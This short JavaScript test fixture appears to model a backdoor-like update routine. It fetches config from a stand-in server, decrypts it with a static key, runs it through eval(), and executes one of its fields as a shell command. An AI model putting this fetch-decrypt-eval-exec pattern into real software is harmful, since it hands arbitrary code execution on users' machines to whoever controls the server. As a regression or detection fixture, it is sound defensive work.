// Synthetic regression fixture: server-supplied config is AES-decrypted,
// eval'd, and one field is passed to a shell start command.
const axios = require('axios');
const { execSync } = require('child_process');
const CryptoJS = require('crypto-js');

const KEY = 'fixture-static-key';

async function refreshSettings(state) {
  const response = await axios.post('https://updates.example-desk.test/getupdate', '');
  const plain = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(response.data.toString(), KEY));
  const settings = eval(plain);
  state.settings = settings;
  if (settings.onOpenCommand) {
    execSync("start " + settings.onOpenCommand);
  }
}

module.exports = { refreshSettings };
